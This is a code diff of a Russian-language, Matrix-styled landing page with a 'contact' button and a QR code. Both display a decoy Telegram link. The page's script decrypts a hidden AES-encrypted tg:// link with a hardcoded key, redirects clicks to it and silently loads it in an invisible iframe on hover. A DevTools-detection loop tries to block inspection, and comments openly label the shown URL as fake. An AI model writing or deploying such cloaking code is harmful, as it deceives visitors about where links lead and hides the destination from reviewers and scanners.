@@ -3,10 +3,9 @@
 <head>
   <meta charset="UTF-8" />
   <title>Matrix Access</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
-
     html, body {
       margin: 0; padding: 0;
       height: 100%;
@@ -21,22 +20,20 @@
       align-items: center;
       text-align: center;
     }
-
     canvas.matrix {
       position: fixed;
       top: 0; left: 0;
-      width: 100%; height: 100%;
+      width: 100vw;
+      height: 100vh;
       z-index: -1;
       display: block;
     }
-
     h1 {
       font-size: 1.8rem;
       margin: 0 0 30px 0;
       text-shadow: 0 0 8px #00ff00;
       line-height: 1.3;
     }
-
     .btn {
       padding: 14px 32px;
       font-size: 1.25rem;
@@ -52,12 +49,10 @@
       display: inline-block;
       margin-bottom: 30px;
     }
-
     .btn:hover {
       background: #00ff00;
       color: black;
     }
-
     #qrcode {
       margin-top: 0;
       pointer-events: auto;
@@ -72,7 +67,6 @@
       box-sizing: border-box;
       margin-bottom: 30px;
     }
-
     .warning {
       color: #ff4444;
       font-size: 0.9rem;
@@ -95,7 +89,8 @@
 
   <h1>Только избранный может подключиться.<br>Нажми “СВЯЗАТЬСЯ”</h1>
 
-  <a id="contactBtn" class="btn" href="https://t.me/join-proxy" tabindex="0" aria-label="Связаться">СВЯЗАТЬСЯ</a>
+  <!-- href = фейковый URL -->
+  <a id="contactBtn" class="btn" href="https://t.me/join-proxy" title="https://t.me/join-proxy" tabindex="0" aria-label="Связаться">СВЯЗАТЬСЯ</a>
 
   <canvas id="qrcode" aria-label="QR код для связи" title="Отсканируй меня или наведи курсор"></canvas>
 
@@ -113,7 +108,7 @@
   <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
   <script>
-    // Защита от DevTools (простая)
+    // Примитивная защита от DevTools
     setInterval(() => {
       const threshold = 160;
       if(window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
@@ -121,49 +116,48 @@
       }
     }, 500);
 
-    // Расшифровка ссылки tg://user?id=...
+    // Расшифровываем реальную tg-ссылку
     const encrypted = "Kx5V3Bt0eTzaBwbgGmlouzKsc5LvDbSef3xND/NzCT4=";
     const key = CryptoJS.MD5("MatrixSecretKey42");
-    const decrypted = CryptoJS.AES.decrypt(encrypted, key, {
+    const realUrl = CryptoJS.AES.decrypt(encrypted, key, {
       iv: key,
       mode: CryptoJS.mode.CBC,
       padding: CryptoJS.pad.Pkcs7
     }).toString(CryptoJS.enc.Utf8);
 
-    // Кнопка — фейк в href, но редирект JS
+    // Фейковая ссылка для показа
+    const fakeUrl = "https://t.me/join-proxy";
+
+    // Кнопка — при клике отменяем дефолт и идём на реальный URL
     document.getElementById('contactBtn').addEventListener('click', e => {
       e.preventDefault();
-      window.location.href = decrypted;
+      window.location.href = realUrl;
     });
 
-    // QR-код — фейковая ссылка
-    const fakeUrl = "https://t.me/join-proxy";
-    const realUrl = decrypted;
-
+    // Генерируем QR с фейковым URL
     const qrCanvas = document.getElementById('qrcode');
     QRCode.toCanvas(qrCanvas, fakeUrl, {
       color: { dark: "#00ff00", light: "#000000" },
       width: 200
-    }, function (error) {
+      }, error => {
       if(error) console.error(error);
     });
-    
-    // При наведении на QR — редирект через iframe, эмуляция сканирования камеры
-    qrCanvas.addEventListener('mouseenter', () => {
-      qrCanvas.style.display = 'none';
 
+    // При наведении на QR создаём iframe для реального перехода
+    qrCanvas.addEventListener('mouseenter', () => {
+      if(document.getElementById('hiddenIframe')) return;
       const iframe = document.createElement('iframe');
+      iframe.id = 'hiddenIframe';
       iframe.style.display = 'none';
       iframe.src = realUrl;
       document.body.appendChild(iframe);
-
       setTimeout(() => {
-        qrCanvas.style.display = 'block';
-        document.body.removeChild(iframe);
-      }, 2000);
+        const el = document.getElementById('hiddenIframe');
+        if(el) el.remove();
+      }, 3000);
     });
 
-    // MATRIX-анимация на фон
+    // MATRIX-анимация на весь экран
     const canvas = document.querySelector('.matrix');
     const ctx = canvas.getContext('2d');
 
@@ -197,5 +191,6 @@
     }
     setInterval(drawMatrix, 50);
   </script>
+
 </body>
 </html>
